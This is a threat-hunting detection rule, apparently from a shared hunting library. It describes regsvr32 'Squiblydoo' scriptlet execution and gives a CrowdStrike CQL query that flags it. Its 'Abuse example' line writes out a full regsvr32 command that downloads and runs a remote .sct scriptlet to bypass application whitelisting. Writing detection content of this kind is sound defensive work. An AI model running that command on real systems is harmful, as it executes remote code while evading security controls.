# Regsvr32 scrobj.dll Scriptlet Remote Execution

#### MITRE ATT&CK Mapping
| Tactic | Technique ID | Title |
| :--- | :--- | :--- |
| Defense Evasion | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) | Regsvr32 |

#### Hypothesis
Looking for regsvr32.exe invoking scrobj.dll with the -i: (scriptlet execution) flag suggests likely execution of a malicious COM scriptlet (.sct), often remotely hosted. Since this bypasses PowerShell, Macros, and AppLocker script controls, it’s a common "Squiblydoo" technique used by attackers to execute arbitrary script code on Windows systems.

This behavior strongly implies adversary-driven script execution, striving to evade application whitelisting and antivirus controls, therefore demanding immediate investigation.

Abuse example:
Execute code from remote scriptlet, bypass Application whitelisting

regsvr32 /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll

#### Platform
* **CrowdStrike Falcon**

#### Author
* **Muhammad Hassoub**

#### References
* https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/

#### Tags
`#Hunting`

---

## CrowdStrike (CQL)

```cql
event_platform = Win #event_simpleName=/ProcessRollup2|ProcessBlocked/i
| FileName="regsvr32.exe"
| format("[Tree](https://falcon.us-2.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s&investigate=true&_cid=%s )", field=["aid","TargetProcessId","cid"], as="Tree")| CommandLine = /scrobj\.dll/ CommandLine = /i\:/i| groupBy([@timestamp, ComputerName, UserName, Tree, ParentBaseFileName, FileName, CommandLine])
```
---
